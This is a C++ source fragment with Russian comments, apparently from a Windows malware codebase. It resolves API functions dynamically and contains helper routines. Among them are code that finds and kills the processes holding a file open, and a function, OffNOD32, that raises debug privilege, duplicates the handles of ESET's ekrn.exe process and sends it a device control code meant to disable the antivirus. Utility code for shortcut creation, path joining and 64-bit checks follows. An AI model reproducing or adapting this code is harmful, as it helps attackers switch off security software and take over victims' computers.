	PNM_INFO Info = (PNM_INFO)MemAlloc(sizeof(NM_INFO));//HeapAlloc(hHeap, 0, sizeof(NM_INFO));
	
	Info->hFile = hFile;
	hThread = (HANDLE)pCreateThread(NULL, 0, GetFileNameThread, Info, 0, NULL);
	
	if ((DWORD)pWaitForSingleObject(hThread, 100) == WAIT_TIMEOUT)
	{
	   pTerminateThread(hThread, 0);
	   pCloseHandle(hThread);
	}

	DWORD res = -1;
	BOOL err = (BOOL)pGetExitCodeThread(hThread, &res);

	TheName [ 0 ] = 0; 
	pWideCharToMultiByte(CP_ACP, 0, Info->Info.FileName - 4, Info->Info.FileNameLength >> 1, TheName, MAX_PATH, NULL, NULL);
	MemFree(Info);
}

 

static int FindBlockingProcesses( const char* FileName, ULONG* PIDs, int c_PIDs )
{
	PSYSTEM_HANDLE_INFORMATION Info;
	ULONG                      r;
	CHAR                       Name[MAX_PATH];
	HANDLE                     hProcess, hFile;
	UCHAR                      ObFileType;

	int procCount = 0;


	ObFileType = GetFileHandleType();

	Info = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);

	if (Info)
	{
		for (r = 0; r < Info->uCount; r++)
		{
			if (Info->aSH[r].ObjectType == ObFileType)
			{
				hProcess = (HANDLE)pOpenProcess(PROCESS_DUP_HANDLE, FALSE, Info->aSH[r].uIdProcess);

				if (hProcess)
				{
					if (pDuplicateHandle(hProcess, (HANDLE)Info->aSH[r].Handle,
						(HANDLE)pGetCurrentProcess(), &hFile, 0, FALSE, DUPLICATE_SAME_ACCESS))
					{
 						GetFileName( hFile, Name );
						StrLowerCase(Name);
							
						if( Name[0] != 0 && m_strstr( Name, FileName ) != NULL )
						{
							PIDs[procCount] = Info->aSH[r].uIdProcess;
							procCount++;
							if( procCount >= c_PIDs ) break;
						}
						pCloseHandle(hFile);
					}
					pCloseHandle(hProcess);
				}
			}
		}
		MemFree(Info);
	}
	return procCount;
}

//уничтожает процессы которые держат указанный файл
void KillBlockingProcesses( const char* fileName )
{
	ULONG PIDS[10];

	int counter = 0; //счетчик попыток уничтожения процессов
	int countProcess;
	while( ( countProcess = FindBlockingProcesses( fileName, PIDS, 10 ) ) && counter < 3 )
	{
		counter++;
		while( countProcess-- )
		{
			KillProcess( PIDS[countProcess], 1000 );
		};
	};	
}

DWORD GetProcessIdByName(PCHAR ProcessName)
{
	DWORD Result = NULL;
	PROCESSENTRY32 ProcessEntry;
	ClearStruct(ProcessEntry);
	HANDLE hSnap;

	hSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		ProcessEntry.dwSize = sizeof(ProcessEntry);
		if (pProcess32First(hSnap, &ProcessEntry))
		{
			do 
			{
				if (!m_lstrcmp(ProcessName, ProcessEntry.szExeFile))
				{
					Result = ProcessEntry.th32ProcessID;
					break;
				}
			}
			while (pProcess32Next(hSnap, &ProcessEntry));
		}

		pCloseHandle(hSnap);
	}

	return Result;
}

//Отключение NOD32
static VOID SendCmdOffNOD32(PVOID hObject)
{
	IO_STATUS_BLOCK StatusBlock;
	UCHAR Buff[4];
	*((DWORD*)Buff) = 1;

	pNtDeviceIoControlFile(hObject, NULL, NULL, NULL, &StatusBlock, 0x88770034, Buff, sizeof(Buff), Buff, sizeof(Buff));

	/*IO_STATUS_BLOCK StatusBlock;
	UCHAR Buff[0x4] = {0x0};

	NtDeviceIoControlFile(hObject, NULL, NULL, NULL, &StatusBlock, 0x88770034, 0, 0, Buff, sizeof(Buff));*/
}

static PVOID GetSystemInformation(SYSTEM_INFORMATION_CLASS dwInfoClass)
{
	NTSTATUS St;
	DWORD dwSize = 1000;
	PVOID pvInfo = NULL;

	do
	{
		pvInfo = MemAlloc(dwSize);
		if (!pvInfo) return NULL;

		St = (NTSTATUS)pNtQuerySystemInformation(dwInfoClass, pvInfo, dwSize, NULL); 
		if (!NT_SUCCESS(St))
		{
			MemFree(pvInfo);

			dwSize += 1000;
			pvInfo = NULL;
		}
	} 
	while (St == STATUS_INFO_LENGTH_MISMATCH);

	return pvInfo;
}

//Отключает НОД32
VOID OffNOD32()
{	
	BOOL bRet = FALSE;
	BOOLEAN bEnable;

	pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE,TRUE,FALSE,&bEnable);

	DWORD dwPid = GetProcessIdByName("ekrn.exe");
	if (dwPid)
	{
		HANDLE hProcess = pOpenProcess(PROCESS_DUP_HANDLE|PROCESS_QUERY_INFORMATION, FALSE, dwPid);
		if (hProcess != INVALID_HANDLE_VALUE)
		{
			PVOID PvInfo = GetSystemInformation(SystemHandleInformation);
			if (PvInfo)
			{
				PSYSTEM_HANDLE_INFORMATION pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)PvInfo;
				for (DWORD dwIdx = 0; dwIdx < pHandleInfo->uCount; dwIdx++)
				{
					if (pHandleInfo->aSH[dwIdx].uIdProcess == dwPid)
					{
						HANDLE hObject = NULL;
						if (pDuplicateHandle(hProcess, (HANDLE)pHandleInfo->aSH[dwIdx].Handle, NtCurrentProcess(), &hObject, DUPLICATE_SAME_ACCESS, FALSE, DUPLICATE_SAME_ACCESS) != FALSE)
						{
							RunThread( SendCmdOffNOD32, hObject );
							pCloseHandle(hObject);
						}
					}
				}

				MemFree(PvInfo);
			}

			pCloseHandle(hProcess);
		}
	}
}




//---------------------------------------------------------
//  Функция создаёт ярлык
//  Параметры:
//  	LinkFileName - Имя файла создаваемого ярлыка
//      Object - объект на который будет ссылаться ярлык
//      CommandLine - командная строка для запуска обхекта
//      Description - Описание ярлыка/обхекта
//      IconFileName - Имя файла иконки
//---------------------------------------------------------
void CreateLink( const char* LinkFileName, const char* Object, const char* CommandLine,
						const char* Description, const char* IconFileName )

{
  	pCoInitialize( NULL );
	IShellLink* sl;
	pCoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
				   &IID_IShellLink, (void**)&sl );
	sl->SetPath( Object );
	sl->SetDescription( Description );
	sl->SetArguments( CommandLine );
	if(!STRA::IsEmpty(IconFileName))
		sl->SetIconLocation( IconFileName, 0 );
	IPersistFile* pf;
	sl->QueryInterface( IID_IPersistFile, (void**)&pf );
	wchar_t wpath[MAX_PATH];
	pMultiByteToWideChar( CP_ACP, 0, LinkFileName, -1, wpath, MAX_PATH );
	pf->Save( wpath, TRUE );
	pf->Release();
	sl->Release();
	pCoUninitialize();
}


//---------------------------------------------------------
//  CombineFileName - функция создаёт полное имя файла
//  на осное пути Path и имени файла FileName
//---------------------------------------------------------
string CombineFileName(const char* Path, const char* FileName)
{
	string F = Path;

	// Добавляем слэш
	if (!F.IsEmpty())
	{
		char C = F[F.Length() - 1];
		if (C != '\\' && C != '/')
			F += "\\";
	}

	// Добавляем имя файла
	if (!STRA::IsEmpty(FileName))
	{
		char C = *FileName;
		if (C == '\\' || C == '/')
			FileName++;
		F += FileName;
    }
	return F;
}


//---------------------------------------------------------
//  IsWIN64 - Функция возвращает истину в случае если,
//  Windows вляется 64 разрядным
//
//  To-Do: В данный момент функция проверяет архитектуру
//         процессора, что даст нам ошибку если на 64 битном
//         железе стоит 32 битная винда. Соответственно
//         необходимо найти нормальный
//---------------------------------------------------------
bool IsWIN64()
{
	SYSTEM_INFO SI;
	pGetNativeSystemInfo(&SI);
	return SI.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
}


//---------------------------------------------------------
//  IsWOW64 - Функция возвращает истину если процесс, PID
//            которого передали, запущен под системой WOW64,
//            что означает запуск 32 битного процесса в 64
//            битной винде
//  Для получения информации о текущем процессе необходимо
//  передать ередать нудевой пид:
//  	IsWOW64(0);
//---------------------------------------------------------
bool IsWOW64(DWORD PID)
{
	BOOL Result = FALSE;
	if (!PID)
		pIsWow64Process(GetCurrentProcess(), &Result);
	else
	{
		HANDLE Process = (HANDLE)pOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
		if (!pIsWow64Process(Process, &Result))
			Result = FALSE;
		pCloseHandle(Process);
	}
	return Result != FALSE;
}
